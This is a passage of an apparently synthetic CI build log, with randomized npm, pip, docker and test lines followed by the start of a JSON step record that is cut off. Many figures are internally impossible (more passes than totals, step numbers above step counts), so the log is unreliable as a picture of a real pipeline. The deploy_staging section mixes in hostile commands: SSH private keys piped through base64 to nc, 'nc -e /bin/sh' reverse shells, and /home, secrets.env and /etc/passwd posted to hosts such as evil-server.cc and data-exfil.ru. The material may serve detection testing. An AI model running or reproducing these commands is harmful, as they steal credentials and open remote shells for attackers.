integration/test_auth_login.spec.js\nPlatform: darwin-arm64\n[12:46:59] INFO: Processing request\n[12:46:59] INFO: Starting build process\n\u2713 build completed\nArtifact downloaded: 40MB\n=== Step integration_tests completed ===\n=== Step: checkout ===\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 15/21: Testing\nHEAD is now at 9574879\n[12:46:59] INFO: Cache refreshed\nTest Suites: 8 passed, 18 total\nnpm install: added 388 packages\nnpm notice: created a lockfile\nCompiling utils/utils.go...\nVerifying...\nBundling styles.js\nWARNING: express has known vulnerabilities\nStep 19/16: Deploying\nLoading...\nWaiting...\npip install: Successfully installed prettier-5.4\nCompiling src/main.py...\nCache hit for key-6900\npip: Downloading webpack-1.11.tar.gz\nBundling vendor.css\n[12:46:59] WARN: Deprecated API usage\n  PASS: e2e/test_auth_login.spec.js\nCache saved successfully\npip: Downloading lodash-2.3.tar.gz\n\u2713 All checks passed\nCompiling lib/handler.rs...\nStep 10/15: Testing\nPlatform: darwin-arm64\nLoading...\nWaiting...\n[12:46:59] WARN: Deprecated API usage\nTime: 14.548s\n\u2713 Step 'setup' succeeded\nBuilding Docker image...\nArtifact uploaded: build.tar.gz (4MB)\nGenerating source maps...\nCache saved successfully\nSnapshots: 47 passed, 47 total\n\u2713 All checks passed\nPOST /data - 200 (274ms)\nTests: 111 passed, 184 total\nDone.\nSnapshots: 32 passed, 38 total\nUsing Python 3.11\nCache miss for key-4444\nVerifying...\nCompiling lib/index.js...\nPlatform: linux-x64\n  PASS: test_user_create (170ms)\nyarn add: Done in 27.47s\nArtifact downloaded: 3MB\nCoverage: 88% statements, 83% branches\nPOST /upload - 200 (74ms)\nUsing Node.js 14.9.9\n[12:46:59] DEBUG: Query executed in 46ms\nStep 20/24: Testing\n\u2713 Task completed in 1037ms\nFetching from https://googleapis.com/package.json\n[12:46:59] DEBUG: Connection pool: 14 active\nImage pulled successfully\nCoverage: 79% statements, 77% branches\nTime: 86.247s\nBuilding Docker image...\nTransforming 639 files...\nnpm install: resolved 446 packages\nBundling styles.js\nSwitched to branch 'bugfix/task-652'\nCache hit for key-9506\nOptimizing 13 modules...\nCompiling components/app.ts...\nStep 1/20: Linting\nUsing Node.js 14.16.7\nnpm notice: package.json updated\nGenerating source maps...\nTime: 3.505s\n\u2717 build failed with exit code 123\nCoverage: 84% statements, 82% branches\nInstalling webpack@2.20.8\nCache hit for key-4914\nStep 10/19: Linting\nWARNING: eslint has known vulnerabilities\nChecking out master branch\nPushing to registry...\n[12:46:59] INFO: Connecting to database\nConnection established\nStep 18/19: Testing\nAlready up to date.\nUsing Node.js 18.13.0\nCompiling utils/index.js...\n[12:46:59] WARN: Deprecated API usage\nCoverage: 79% statements, 61% branches\nHEAD is now at 745c770\n[12:46:59] INFO: Processing request\n[12:46:59] INFO: Cache refreshed\n\u2713 Step 'setup' succeeded\nRan 47 tests in 54s\n[12:46:59] INFO: Request completed\nCache restored successfully (427MB)\n[12:46:59] ERROR: Connection failed\npip: Downloading webpack-3.7.tar.gz\nTests: 309 passed, 424 total\nTests: 295 passed, 265 total\nHEAD is now at 2d217bc\n\u2713 Step 'checkout' succeeded\nyarn add: Done in 16.63s\nPulling image: python:3.11\npip: Downloading express-4.10.tar.gz\n[12:46:59] INFO: Cache refreshed\nPushing to registry...\nTransforming 371 files...\nWARNING: express has known vulnerabilities\n[12:46:59] DEBUG: Memory usage: 770MB\n\u2713 test completed\nSnapshots: 29 passed, 21 total\n\u2713 package completed\n[12:46:59] INFO: Connecting to database\nNODE_ENV=development\nWARNING: webpack has known vulnerabilities\n\u2713 deploy completed\nFinished.\nFetching from https://gcr.io/package.json\nAlready up to date.\nArtifact uploaded: build.tar.gz (6MB)\n[12:46:59] WARN: Deprecated API usage\nHEAD is now at 98099cd\nProcessing...\nCreating production build...\nStep 1/17: Installing dependencies\nWARNING: jest has known vulnerabilities\nCompiling src/service.java...\nStep 13/24: Deploying\nStep 19/16: Building\n[12:46:59] INFO: Cache refreshed\nRan 131 tests in 9s\nHEAD is now at efb2a5f\nTransforming 890 files...\nArtifact uploaded: build.tar.gz (47MB)\nPOST /data - 201 (285ms)\nUsing Python 3.10\nStep 4/15: Installing dependencies\n[12:46:59] DEBUG: Loading configuration\nStep 16/21: Installing dependencies\nChecking out master branch\n[12:46:59] INFO: Request completed\nnpm install: added 153 packages\nPlatform: win32-x64\nFetching from https://amazonaws.com/package.json\n  PASS: test_api_health (42ms)\nCompiling src/service.java...\n[12:46:59] INFO: Connecting to database\nPushing to registry...\nTest Suites: 47 passed, 6 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling components/app.ts...\nStep 19/25: Testing\n\u2713 All checks passed\nWARNING: react has known vulnerabilities\nTest Suites: 47 passed, 47 total\nSuccess!\nMinifying app.js\nStep 16/22: Running migrations\nNODE_ENV=development\nArtifact downloaded: 1MB\nMinifying vendor.js\nAlready up to date.\n[12:46:59] INFO: Processing request\n[12:46:59] INFO: Starting build process\nException: NullPointerException\nArtifact downloaded: 15MB\nPlatform: win32-x64\nMinifying app.js\nCache hit for key-6571\nPOST /upload - 202 (445ms)\nTLS handshake completed\nStep 6/19: Running migrations\n  PASS: unit/test_auth_login.spec.js\nArtifact uploaded: build.tar.gz (21MB)\nyarn add: Done in 29.79s\nTest Suites: 11 passed, 30 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTest Suites: 30 passed, 13 total\nInstalling react@4.10.2\nPlatform: darwin-arm64\n  PASS: e2e/test_cache_hit.spec.js\nSnapshots: 24 passed, 30 total\npip: Downloading jest-4.10.tar.gz\n[12:46:59] INFO: Starting build process\nnpm notice: created a lockfile\npip: Installing build dependencies...\nMinifying app.js\n\u2717 build failed with exit code 54\n  PASS: integration/test_user_create.spec.js\nStep 19/25: Installing dependencies\n[12:46:59] INFO: Starting build process\nStep 2/22: Linting\nVerifying...\nOK\nTransforming 771 files...\nStep 1/15: Linting\nOK\n[12:46:59] DEBUG: Initializing service\nUploading artifact 'build' (43 files)\nPOST /upload - 201 (360ms)\nCache invalidated: node_modules\nProcessing...\n[12:46:59] WARN: Deprecated API usage\nFinished.\nOptimizing 11 modules...\npip: Collecting react\n  PASS: test_cache_hit (200ms)\nTransforming 416 files...\n[12:46:59] INFO: Cache refreshed\nCompiling lib/app.ts...\nCompiling src/handler.rs...\nBuilding Docker image...\nnpm notice: package.json updated\npip: Installing build dependencies...\nGET /health - 204 (7ms)\nCompiling lib/handler.rs...\npip: Installing build dependencies...\nWARNING: react has known vulnerabilities\nVerifying...\npip: Downloading jest-1.17.tar.gz\npip install: Successfully installed express-2.13\nSnapshots: 8 passed, 30 total\nCompiling utils/main.py...\nRan 21 tests in 40s\npip: Downloading eslint-2.2.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:59] DEBUG: Connection pool: 14 active\nWARNING: prettier has known vulnerabilities\nUsing Python 3.12\nFinished.\n=== Step checkout completed ===\n=== Step: restore_cache ===\nException: ValueError\nStep 12/24: Deploying\nOK\nEnvironment: development\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:59] DEBUG: Connection pool: 10 active\n[12:46:59] DEBUG: Loading configuration\nUsing Python 3.10\nnpm install: added 349 packages\nArtifact uploaded: dist.zip (44MB)\nCache hit for key-3531\nAlready up to date.\nnpm install: resolved 1788 packages\n[12:46:59] ERROR: Connection failed\n\u2713 Task completed in 2384ms\npip: Downloading webpack-2.5.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:59] INFO: Processing request\nStep 12/16: Linting\n[12:46:59] WARN: Deprecated API usage\nGET /health - 200 (80ms)\nStep 6/24: Building\nPushing to registry...\nStep 9/15: Deploying\npip: Collecting express\npip install: Successfully installed react-3.3\nStep 8/15: Linting\nAlready up to date.\nnpm notice: created a lockfile\nNODE_ENV=production\n  PASS: test_user_create (20ms)\nStep 12/17: Linting\n[12:46:59] DEBUG: Query executed in 18ms\nTest Suites: 46 passed, 29 total\nVerifying...\nPulling image: alpine:latest\nException: ValueError\nCompiling components/handler.rs...\nNODE_ENV=production\nPulling image: node:latest\n[12:46:59] INFO: Processing request\n[12:46:59] DEBUG: Memory usage: 258MB\nNODE_ENV=production\nWaiting...\nWaiting...\n\u2713 Task completed in 4875ms\n[12:46:59] INFO: Request completed\nSwitched to branch 'feature/task-739'\nSnapshots: 12 passed, 37 total\nLoading...\nWARNING: webpack has known vulnerabilities\nAlready up to date.\nMinifying app.js\nLoading...\nLayer 7/9: COPY command\nCache saved successfully\npip: Collecting lodash\n[12:46:59] INFO: Request completed\nnpm install: resolved 296 packages\nReady.\nTransforming 587 files...\nInstalling express@2.9.2\n\u2713 All checks passed\nCompiling lib/index.js...\nDone.\npip: Downloading webpack-4.10.tar.gz\n[12:46:59] INFO: Request completed\nStep 5/17: Testing\nSwitched to branch 'bugfix/task-422'\nCompleted.\nLoading...\n[12:46:59] INFO: Connecting to database\n[12:46:59] INFO: Processing request\nNODE_ENV=development\nEnvironment: production\nnpm notice: created a lockfile\nTime: 26.845s\nCoverage: 97% statements, 68% branches\nInstalling lodash@2.4.8\nVerifying...\nLoading...\nStep 6/20: Installing dependencies\nGenerating source maps...\nCache invalidated: build\nNODE_ENV=production\nPlatform: darwin-arm64\nUploading artifact 'coverage' (16 files)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFetching from https://registry.npmjs.org/package.json\nnpm install: added 404 packages\nCache miss for key-8523\nFinished.\n[12:46:59] WARN: Deprecated API usage\n  PASS: test_api_health (345ms)\nReady.\n\u2713 Step 'checkout' succeeded\nPulling image: node:18\npip install: Successfully installed eslint-5.20\nWaiting...\nCompiling lib/main.py...\npip: Installing build dependencies...\nTests: 405 passed, 101 total\nCompleted.\nCompiling components/app.ts...\nUploading artifact 'dist' (22 files)\nTransforming 818 files...\n[12:46:59] WARN: Deprecated API usage\nImage pulled successfully\nCache restored successfully (358MB)\n\u2713 All checks passed\n[12:46:59] DEBUG: Connection pool: 13 active\nTransforming 568 files...\nCompleted.\nFAILED: test_auth_login\n[12:46:59] DEBUG: Connection pool: 16 active\nCoverage: 86% statements, 92% branches\nVerifying...\nStep 15/23: Running migrations\nProcessing...\nOK\nCompiling src/service.java...\nArtifact uploaded: dist.zip (15MB)\nSuccess!\nnpm notice: package.json updated\nUsing Python 3.11\nArtifact uploaded: build.tar.gz (36MB)\nVerifying...\npip: Collecting react\nCompiling src/service.java...\nPOST /upload - 200 (415ms)\nAlready up to date.\nArtifact uploaded: build.tar.gz (33MB)\nImage pulled successfully\nProcessing...\n[12:46:59] ERROR: Connection failed\n\u2713 Task completed in 599ms\nCoverage: 93% statements, 80% branches\n[12:46:59] DEBUG: Query executed in 38ms\nReady.\nNODE_ENV=development\nLoading...\nWaiting...\nWARNING: axios has known vulnerabilities\n[12:46:59] INFO: Cache refreshed\nCompiling utils/app.ts...\nArtifact uploaded: dist.zip (21MB)\n[12:46:59] ERROR: Connection failed\nPushing to registry...\nCreating production build...\nStep 17/21: Testing\npip: Collecting eslint\nOK\nTransforming 982 files...\nEnvironment: development\nGET /status - 201 (63ms)\nCreating production build...\nCompiling utils/main.py...\npip install: Successfully installed jest-1.9\npip: Collecting axios\nWARNING: express has known vulnerabilities\npip: Collecting axios\npip install: Successfully installed axios-2.9\nNODE_ENV=production\nRan 170 tests in 6s\nImage pulled successfully\nArtifact uploaded: dist.zip (62MB)\n[12:46:59] DEBUG: Query executed in 98ms\nnpm install: resolved 436 packages\nSuccess!\nPOST /upload - 200 (331ms)\nCache invalidated: dependencies\n[12:46:59] WARN: Deprecated API usage\n[12:46:59] DEBUG: Memory usage: 445MB\nProcessing...\nSwitched to branch 'hotfix/task-307'\n[12:46:59] DEBUG: Loading configuration\n[12:46:59] WARN: Deprecated API usage\nCompiling utils/service.java...\nyarn add: Done in 13.78s\n\u2713 Task completed in 1458ms\nEnvironment: test\nArtifact uploaded: dist.zip (73MB)\nTime: 93.198s\nTest Suites: 13 passed, 35 total\nStep 2/23: Linting\nStep 20/17: Deploying\nTransforming 272 files...\nWARNING: eslint has known vulnerabilities\nAlready up to date.\n\u2713 All checks passed\nCompleted.\nMinifying app.js\nyarn add: Done in 3.74s\nTest Suites: 43 passed, 33 total\n[12:46:59] ERROR: Connection failed\nReady.\n[12:46:59] WARN: Deprecated API usage\nnpm install: added 149 packages\nInstalling express@2.3.6\nFAILED: test_auth_login\nCache restored successfully (147MB)\nPushing to registry...\n  PASS: test_db_connect (341ms)\nHEAD is now at 1e79fc3\nCompiling src/app.ts...\nSuccess!\nStep 3/21: Deploying\nCoverage: 100% statements, 70% branches\nLoading...\nCompiling utils/index.js...\nInstalling webpack@5.14.1\nnpm install: resolved 1389 packages\n[12:46:59] WARN: Deprecated API usage\nEnvironment: staging\nSnapshots: 6 passed, 47 total\npip: Downloading express-4.9.tar.gz\nDone.\nCache invalidated: build\nMinifying vendor.js\nStep 14/17: Running migrations\nBundling main.css\nCompiling lib/handler.rs...\nLoading...\nnpm notice: package.json updated\nCompiling src/app.ts...\n\u2713 All checks passed\nHEAD is now at 0593c71\nStep 3/20: Building\nLoading...\nStep 19/23: Linting\n  PASS: unit/test_api_health.spec.js\nOptimizing 81 modules...\n[12:46:59] DEBUG: Query executed in 30ms\n=== Step restore_cache completed ===\n=== Step: unit_tests ===\n[12:46:59] INFO: Connecting to database\n[12:46:59] ERROR: Connection failed\nConnection established\nWARNING: webpack has known vulnerabilities\nPulling image: python:latest\n\u2717 build failed with exit code 1\nTransforming 193 files...\nFetching from https://googleapis.com/package.json\nRan 114 tests in 23s\nUploading artifact 'build' (6 files)\nRan 131 tests in 19s\nReady.\nTests: 164 passed, 330 total\nSuccess!\nLoading...\nFAILED: test_cache_hit\nCache hit for key-9240\nUploading artifact 'coverage' (18 files)\nFetching from https://docker.io/package.json\nPlatform: linux-x64\nTests: 56 passed, 51 total\nCache invalidated: build\nImage pulled successfully\nTLS handshake completed\nException: RuntimeError\nCompiling src/main.py...\nOK\nGenerating source maps...\nSwitched to branch 'hotfix/task-220'\nTransforming 816 files...\n  PASS: e2e/test_user_create.spec.js\nTransforming 668 files...\nWaiting...\nPushing to registry...\nWARNING: axios has known vulnerabilities\n[12:46:59] WARN: Deprecated API usage\nyarn add: Done in 9.18s\nTransforming 512 files...\nTransforming 719 files...\nNODE_ENV=production\nCoverage: 89% statements, 65% branches\nyarn add: Done in 19.46s\n[12:46:59] INFO: Request completed\nSwitched to branch 'feature/task-730'\n[12:46:59] DEBUG: Connection pool: 4 active\nCompiling src/handler.rs...\nPushing to registry...\n\u2713 Task completed in 4128ms\nArtifact uploaded: dist.zip (39MB)\nFetching submodules...\nMinifying app.js\nCache miss for key-3272\nSwitched to branch 'bugfix/task-639'\nGenerating source maps...\nCompleted.\nArtifact uploaded: dist.zip (4MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip: Downloading prettier-3.6.tar.gz\nImage pulled successfully\n[12:46:59] DEBUG: Connection pool: 16 active\n[12:46:59] DEBUG: Query executed in 32ms\nCompiling src/app.ts...\nCreating production build...\nCache invalidated: build\nHEAD is now at 3986eba\nWARNING: express has known vulnerabilities\n[12:46:59] INFO: Cache refreshed\n[12:46:59] DEBUG: Initializing service\nPOST /upload - 200 (37ms)\nNODE_ENV=development\n\u2713 lint completed\nnpm notice: package.json updated\nReady.\nOptimizing 63 modules...\nNODE_ENV=production\nUsing Node.js 15.7.7\nyarn add: Done in 23.95s\nUsing Node.js 15.13.10\nyarn add: Done in 17.71s\npip: Downloading webpack-5.18.tar.gz\n[12:46:59] DEBUG: Loading configuration\nProcessing...\nLayer 2/14: RUN command\nCoverage: 72% statements, 61% branches\nStep 5/15: Building\nBuilding Docker image...\n  PASS: e2e/test_db_connect.spec.js\nArtifact uploaded: dist.zip (43MB)\n[12:46:59] INFO: Request completed\nPushing to registry...\npip install: Successfully installed jest-5.20\nProcessing...\npip install: Successfully installed axios-4.4\nWARNING: lodash has known vulnerabilities\n[12:46:59] DEBUG: Connection pool: 10 active\nTests: 331 passed, 422 total\npip: Downloading lodash-4.12.tar.gz\nReady.\nException: RuntimeError\nWARNING: axios has known vulnerabilities\nStep 20/21: Testing\n[12:46:59] INFO: Processing request\nCache hit for key-1065\npip: Downloading prettier-5.9.tar.gz\nStep 4/24: Building\nTransforming 392 files...\n[12:46:59] DEBUG: Connection pool: 13 active\nStep 16/21: Deploying\nLayer 10/12: ENV command\nEnvironment: development\n  PASS: test_api_health (302ms)\nTLS handshake completed\n[12:46:59] INFO: Request completed\nnpm notice: package.json updated\n[12:46:59] DEBUG: Connection pool: 19 active\nTLS handshake completed\nTransforming 215 files...\n[12:46:59] INFO: Processing request\n[12:46:59] WARN: Deprecated API usage\nWaiting...\nStep 15/23: Deploying\nStep 5/15: Building\nArtifact uploaded: build.tar.gz (12MB)\nPulling image: python:3.11\nChecking out master branch\n[12:46:59] ERROR: Connection failed\nOptimizing 26 modules...\nRan 147 tests in 9s\n\u2713 Task completed in 2938ms\nCache miss for key-4117\nTime: 86.512s\nArtifact uploaded: dist.zip (84MB)\nArtifact downloaded: 25MB\nnpm notice: package.json updated\nTransforming 132 files...\nUploading artifact 'build' (38 files)\n[12:46:59] DEBUG: Memory usage: 1030MB\nInstalling react@4.8.9\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: e2e/test_api_health.spec.js\nCache saved successfully\nStep 18/20: Running migrations\nArtifact downloaded: 25MB\nCoverage: 70% statements, 71% branches\nStep 10/19: Linting\nVerifying...\nPushing to registry...\nCache miss for key-3343\nSnapshots: 24 passed, 11 total\n[12:46:59] INFO: Request completed\nOptimizing 90 modules...\nUploading artifact 'dist' (24 files)\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nChecking out main branch\n[12:46:59] INFO: Processing request\nStep 19/17: Deploying\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nNODE_ENV=production\nDone.\nPulling image: node:latest\nTest Suites: 32 passed, 35 total\nTransforming 123 files...\nArtifact downloaded: 31MB\nStep 18/20: Running migrations\n[12:46:59] WARN: Deprecated API usage\nPulling image: node:latest\nProcessing...\nUsing Python 3.11\npip: Installing build dependencies...\n[12:46:59] INFO: Request completed\npip: Downloading axios-2.9.tar.gz\nFetching from https://googleapis.com/package.json\nException: TypeError\nDone.\nDone.\nReady.\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nConnection established\nBuilding Docker image...\nStep 17/21: Building\n  PASS: test_db_connect (182ms)\nProcessing...\nLoading...\nNODE_ENV=development\nFetching from https://pypi.org/package.json\nCache restored successfully (102MB)\nCompiling utils/app.ts...\nCompiling src/index.js...\nCache hit for key-1143\nUsing Python 3.11\n[12:46:59] DEBUG: Memory usage: 806MB\nEnvironment: production\npip: Installing build dependencies...\n[12:46:59] INFO: Starting build process\nArtifact downloaded: 24MB\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:59] INFO: Cache refreshed\nStep 19/22: Deploying\n\u2717 build failed with exit code 113\nWARNING: express has known vulnerabilities\nArtifact uploaded: dist.zip (51MB)\nPOST /upload - 202 (348ms)\nStep 20/15: Deploying\nImage pulled successfully\nPulling image: python:3.11\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBuilding Docker image...\n\u2713 Step 'install' succeeded\nnpm install: added 317 packages\nTests: 430 passed, 100 total\n\u2713 build completed\nArtifact uploaded: dist.zip (3MB)\nCoverage: 77% statements, 73% branches\n[12:46:59] INFO: Connecting to database\nFetching submodules...\nBuilding Docker image...\nFAILED: test_api_health\nAlready up to date.\nFetching from https://github.com/package.json\npip: Collecting express\nBundling runtime.css\nCache hit for key-2304\nFetching from https://githubusercontent.com/package.json\n[12:46:59] DEBUG: Memory usage: 721MB\nCache miss for key-1193\nAlready up to date.\nCompiling components/app.ts...\nnpm notice: package.json updated\nChecking out develop branch\n=== Step unit_tests completed ===\n=== Step: deploy_staging ===\nCache hit for key-4764\n[12:46:59] DEBUG: Memory usage: 1965MB\nCompiling src/utils.go...\nWARNING: prettier has known vulnerabilities\nPushing to registry...\nPOST /api - 201 (82ms)\nDone.\nArtifact downloaded: 18MB\nStep 2/15: Testing\n[12:46:59] INFO: Cache refreshed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 162.3.150.51 38904\nnpm install: resolved 1666 packages\nSending 38MB of data to malicious-pool.xyz\nSending 240MB of data to data-exfil.ru\n[12:46:59] INFO: Connecting to database\n[12:46:59] DEBUG: Connection pool: 20 active\n[12:46:59] DEBUG: Initializing service\nSnapshots: 9 passed, 27 total\npip: Downloading lodash-5.4.tar.gz\nFAILED: test_db_connect\nImage pulled successfully\nArtifact downloaded: 27MB\nOptimizing 90 modules...\nLayer 7/11: RUN command\nnc -e /bin/sh 12.31.94.178 42352\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nFAILED: test_user_create\nOK\nMinifying app.js\nMinifying app.js\nSending 44MB of data to crypto-mine.io\nTests: 391 passed, 433 total\nFetching submodules...\nCompleted.\nOK\n\u2713 Step 'checkout' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v2.0\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nCompiling lib/app.ts...\nFAILED: test_cache_hit\nUploading artifact 'dist' (19 files)\nPlatform: darwin-arm64\n  PASS: test_db_connect (473ms)\n[12:46:59] DEBUG: Loading configuration\nCache hit for key-4826\n[12:46:59] DEBUG: Loading configuration\n[12:46:59] WARN: Deprecated API usage\nTransforming 232 files...\nLayer 8/13: ENV command\nnpm notice: created a lockfile\n\u2713 Task completed in 4470ms\nRan 67 tests in 5s\n[12:46:59] DEBUG: Query executed in 52ms\nnpm install: resolved 154 packages\nTLS handshake completed\n\u2713 test completed\nLayer 1/15: ENV command\n[12:46:59] DEBUG: Query executed in 64ms\n[12:46:59] INFO: Cache refreshed\nPOST /api - 200 (275ms)\nUsing Python 3.9\nCompiling lib/index.js...\nWARNING: axios has known vulnerabilities\nImage pulled successfully\nChecking out main branch\nPOST /data - 200 (100ms)\nWaiting...\nStep 16/15: Testing\nTransforming 555 files...\n\u2713 Task completed in 882ms\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\nMinifying app.js\nRan 104 tests in 6s\nFetching from https://registry.npmjs.org/package.json\nCache invalidated: node_modules\n\u2713 build completed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 204.136.252.243 32751\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nHEAD is now at ccba8db\nSending 349MB of data to evil-server.cc\nSnapshots: 8 passed, 4 total\nStep 10/21: Deploying\nCompiling lib/handler.rs...\n[12:46:59] INFO: Connecting to database\nOptimizing 15 modules...\nBundling styles.js\nUploading artifact 'coverage' (26 files)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUploading artifact 'dist' (37 files)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPulling image: alpine:18\n[12:46:59] INFO: Cache refreshed\n\u2713 Task completed in 1480ms\nCompleted.\nChecking out main branch\nFAILED: test_user_create\nWaiting...\nEnvironment: production\nCompiling src/index.js...\nDone.\nCoverage: 72% statements, 98% branches\nGET /status - 200 (96ms)\n\u2713 Task completed in 2481ms\n[12:46:59] WARN: Deprecated API usage\nReady.\n[12:46:59] ERROR: Connection failed\nPOST /upload - 200 (498ms)\npip install: Successfully installed axios-3.14\nTransforming 522 files...\nSnapshots: 26 passed, 8 total\nMinifying vendor.js\nFAILED: test_user_create\nCompiling components/service.java...\nSending 131MB of data to data-exfil.ru\nBundling vendor.css\n[12:46:59] WARN: Deprecated API usage\n\u2713 All checks passed\n\u2713 Step 'setup' succeeded\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\nTransforming 723 files...\nTime: 37.823s\nyarn add: Done in 1.3s\nHEAD is now at c1c50a2\nUploading artifact 'coverage' (25 files)\nOptimizing 13 modules...\nCache miss for key-5612\nLayer 9/8: COPY command\nDone.\nLoading...\nnpm install: added 368 packages\nStep 7/23: Running migrations\nCompiling utils/utils.go...\nPOST /upload - 202 (186ms)\nImage pulled successfully\nCache invalidated: build\n  PASS: e2e/test_api_health.spec.js\nSending 71MB of data to evil-server.cc\nLayer 10/8: ENV command\nProcessing...\nUsing Python 3.11\nWARNING: axios has known vulnerabilities\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nFinished.\nEnvironment: production\nnpm notice: package.json updated\nPushing to registry...\nStep 15/23: Installing dependencies\nSending 375MB of data to evil-server.cc\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:59] WARN: Deprecated API usage\npip install: Successfully installed eslint-5.17\nCache hit for key-3662\nCompleted.\nTLS handshake completed\n[12:46:59] ERROR: Connection failed\nFetching from https://gcr.io/package.json\nRan 190 tests in 39s\nCache hit for key-1783\nAlready up to date.\nPulling image: node:latest\nArtifact uploaded: build.tar.gz (48MB)\nCompiling components/index.js...\nCompiling src/utils.go...\nUsing Node.js 19.19.1\nTests: 66 passed, 251 total\nnpm install: resolved 590 packages\nArtifact uploaded: build.tar.gz (25MB)\nGET /api - 201 (52ms)\npip: Collecting prettier\nnpm install: added 41 packages\n  PASS: integration/test_auth_login.spec.js\n\u2713 All checks passed\nAlready up to date.\nMinifying vendor.js\nUsing Python 3.10\nnc -e /bin/sh 44.117.168.77 35544\nPOST /api - 202 (364ms)\n[12:46:59] INFO: Starting build process\nArtifact downloaded: 50MB\n[12:46:59] INFO: Request completed\nFetching submodules...\n[12:46:59] DEBUG: Query executed in 58ms\nPulling image: node:latest\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUploading artifact 'coverage' (7 files)\nCompiling lib/service.java...\nnc -e /bin/sh 209.163.165.220 30114\nTransforming 155 files...\nFinished.\nAlready up to date.\nLayer 7/9: ENV command\n[12:46:59] WARN: Deprecated API usage\nStep 1/22: Running migrations\nSending 441MB of data to crypto-mine.io\nCompiling utils/service.java...\npip install: Successfully installed prettier-5.11\nTest Suites: 39 passed, 49 total\nStep 6/20: Building\nCompleted.\nAlready up to date.\nTests: 53 passed, 450 total\npip: Downloading lodash-2.14.tar.gz\nCompiling lib/app.ts...\nInstalling webpack@3.3.5\nFetching submodules...\n[12:46:59] ERROR: Connection failed\nSuccess!\nFAILED: test_api_health\nFinished.\n[12:46:59] DEBUG: Memory usage: 460MB\nCache restored successfully (226MB)\nStep 17/17: Installing dependencies\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\n[12:46:59] INFO: Processing request\nFetching submodules...\npip: Installing build dependencies...\nTests: 292 passed, 85 total\nCompiling components/main.py...\n[12:46:59] WARN: Deprecated API usage\npip: Installing build dependencies...\nCompiling lib/service.java...\nTLS handshake completed\n[12:46:59] INFO: Cache refreshed\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nOK\nGET /health - 201 (17ms)\n[12:46:59] INFO: Cache refreshed\nFinished.\n[12:46:59] ERROR: Connection failed\nCache invalidated: dependencies\nGenerating source maps...\nSending 477MB of data to malicious-pool.xyz\nnc -e /bin/sh 116.182.255.77 23158\nTests: 116 passed, 162 total\n\u2713 Step 'install' succeeded\nProcessing...\nArtifact uploaded: dist.zip (27MB)\nSending 17MB of data to crypto-mine.io\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 19/20: Running migrations\nCache miss for key-4369\n\u2713 deploy completed\npip: Installing build dependencies...\nWARNING: prettier has known vulnerabilities\nGenerating source maps...\nStep 20/21: Building\nDone.\nTime: 107.733s\npip: Downloading prettier-5.17.tar.gz\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nHEAD is now at bc41aec\n[12:46:59] DEBUG: Connection pool: 19 active\nSending 315MB of data to evil-server.cc\nConnection established\nPulling image: python:latest\n[12:46:59] DEBUG: Memory usage: 379MB\nCache hit for key-6164\n=== Step deploy_staging completed ===",
    "steps": [
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-02T12:46:59.711232",
        "finished_at": "2025-12-02T12:47:44.476635",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Compiling utils/service.java...",
          "\u2717 build failed with exit code 33",
          "Compiling src/handler.rs...",
          "TLS handshake completed",
          "[12:46:59] WARN: Deprecated API usage",
          "  PASS: test_api_health (427ms)",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Checking out main branch",
          "Artifact downloaded: 40MB",
          "Compiling components/handler.rs...",
          "Platform: darwin-arm64",
          "Step 5/21: Testing",
          "Cache restored successfully (203MB)",
          "  PASS: unit/test_user_create.spec.js",
          "\u2713 All checks passed",
          "Building Docker image...",
          "Fetching submodules...",
          "\u2713 package completed",
          "Step 10/21: Testing",
          "[12:46:59] INFO: Processing request",
          "Cache saved successfully",
          "Cache hit for key-3470",
          "POST /upload - 202 (367ms)",
          "Pushing to registry...",
          "Already up to date.",
          "[12:46:59] DEBUG: Connection pool: 15 active",
          "OK",
          "Installing prettier@1.19.0",
          "  PASS: test_api_health (274ms)",
          "npm install: added 123 packages",
          "Transforming 228 files...",
          "Platform: linux-x64",
          "\u2713 Task completed in 4647ms",
          "Environment: test",
          "Compiling utils/app.ts...",
          "Platform: darwin-arm64",
          "GET /status - 204 (25ms)",
          "Success!",
          "[12:46:59] INFO: Request completed",
          "[12:46:59] DEBUG: Memory usage: 1156MB",
          "Coverage: 75% statements, 97% branches",
          "Cache invalidated: dependencies",
          "Finished.",
          "npm notice: created a lockfile",
          "Installing webpack@4.1.0",
          "  PASS: unit/test_auth_login.spec.js",
          "Processing...",
          "Loading...",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (42MB)",
